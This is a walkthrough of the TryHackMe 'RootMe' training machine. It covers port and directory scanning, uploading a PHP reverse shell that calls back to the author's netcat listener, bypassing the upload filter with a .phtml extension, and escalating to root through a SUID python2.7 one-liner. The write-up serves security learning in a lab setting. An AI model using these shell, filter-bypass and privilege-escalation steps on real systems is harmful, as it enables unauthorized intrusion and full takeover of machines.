# TryHackMe - RootMe (Write-Up)

_4 min read · February 26, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**RootMe**](https://tryhackme.com/room/rrootme) machine from [**TryHackMe**](https://tryhackme.com/).

- Goal: Become Root
- Difficulty: Easy
- Machine Author: ReddyyZ

---

## Scanning for Open Ports

The machine IP address in my case is **10.48.168.116**.

As usual:

```bash
nmap 10.48.168.116
sudo nmap -sCV -p 22,80 10.48.168.116
```

![Nmap Output](./img/thm-rootme/Nmap-output.png)

From the scan result, I noticed that:

- SSH (port 22) is open.
- HTTP (port 80) is open.

As usual, I browsed the site first.

![RootMe: Website](./img/thm-rootme/web.png)

There was nothing interesting on the main page, and I didn’t find anything useful in the page source either.

---

## Futher Enumeration on the Website

I used [**Gobuster**](https://www.kali.org/tools/gobuster/) to enumerate the site.

```bash
gobuster dir -u http://10.48.168.116/ -w /usr/share/wordlists/dirb/common.txt
```

![Gobuster Output](./img/thm-rootme/gobuster-output.png)

Then I accessed `/panel` directory.

![RootMe: Website /panel](./img/thm-rootme/web-panel.png)

Here, I can upload a file.

---

## Gaining the Machine Shell

I copied the PHP reverse shell available on my machine:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

Then I modified the IP address and port inside the script:

```php
$ip = '192.168.223.226';  // CHANGE THIS
$port = 4418;       // CHANGE THIS
```

Next, I set up a listener using [**netcat**](https://www.kali.org/tools/netcat/):

```bash
nc -lvp 4418
```

And I uploaded the file.

![RootMe: Website /panel Error](./img/thm-rootme/web-panel-err.png)

However, the server rejected it because `.php` file extension was not allowed.

I then changed the extension to `.phtml`:

```bash
mv php-reverse-shell.php php-reverse-shell.phtml
```

And the upload was successful.

After that, I navigated to `/uploads` directory and clicked the uploaded file.

![RootMe: Website /uploads](./img/thm-rootme/web-uploads.png)

Once triggered, I received a reverse shell connection.

---

## Post-Exploitation

After gaining access to the machine, I enumerated the directories and found **user flag** in `/var/www`.

```bash
cd /var/www
ls
cat user.txt
```

![User Flag](./img/thm-rootme/user-flag.png)

---

## Privilege Escalation

I searched for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

![SUID Results](./img/thm-rootme/SUIDs.png)

I noticed `python2.7` with the SUID bit set.

I looked it up on [GTFOBins](https://gtfobins.org/gtfobins/python/) and used the following command:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

![PrivEsc](./img/thm-rootme/privesc.png)

Because the binary was running with SUID privileges, this spawned a root shell.

I then navigated to `/root` and retrieved the **root flag**:

```bash
cd /root
ls
cat root.txt
```

![Root Flag](./img/thm-rootme/root-flag.png)

Bomba! Settleee.

---

## Session Terminated

From this machine, I learned how to:

- identify and exploit insecure file upload functionality
- bypass extension filtering to achieve remote code execution
- abuse SUID Python binaries to spawn a root shell

Thank you for reading and see you next time!
